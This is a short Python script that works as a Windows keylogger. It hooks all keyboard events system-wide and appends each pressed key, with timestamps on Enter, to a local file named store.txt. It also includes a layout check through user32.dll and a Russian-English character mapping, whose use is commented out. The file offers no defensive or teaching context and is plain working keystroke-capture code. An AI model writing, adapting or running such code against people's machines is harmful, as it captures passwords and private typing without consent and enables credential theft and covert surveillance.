import keyboard
import datetime
import ctypes


def know_layout():
    layout = {68748313: "rus", 67699721: "eng"}

    u = ctypes.windll.LoadLibrary("user32.dll")
    pf = getattr(u, "GetKeyboardLayout")
    return layout[pf(0)]


def change_layout(letter):
    _eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
    _rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"

    if know_layout() == "eng":
        return letter
    pos = _eng_chars.find(letter)
    return _rus_chars[pos]


with open('store.txt', 'w', encoding='utf-8') as file:
    file.write('')


def pressed_keys(press):
    if press.event_type == 'down':
        letter = str(press.name)
        time = datetime.datetime.now().strftime('%H:%M')
        store = open('store.txt', 'a')
        update(letter, ' ' + time, store)


def is_need_to_write(letter):
    d = ['alt', 'shift', 'tab', 'up', 'down', 'left', 'right']
    if letter in d:
        return False
    return True


def update(letter, time, store):
    if not is_need_to_write(letter):
        return
    if letter == 'space':
        store.write(' ')
    elif letter == 'enter':
        store.write(time + ' ' + '\n')
    elif letter == 'backspace':
        store.write(' ' + letter + ' ')
    else:
        # letter = change_layout(letter)
        store.write(letter)
    store.close()


keyboard.hook(pressed_keys)
keyboard.wait()
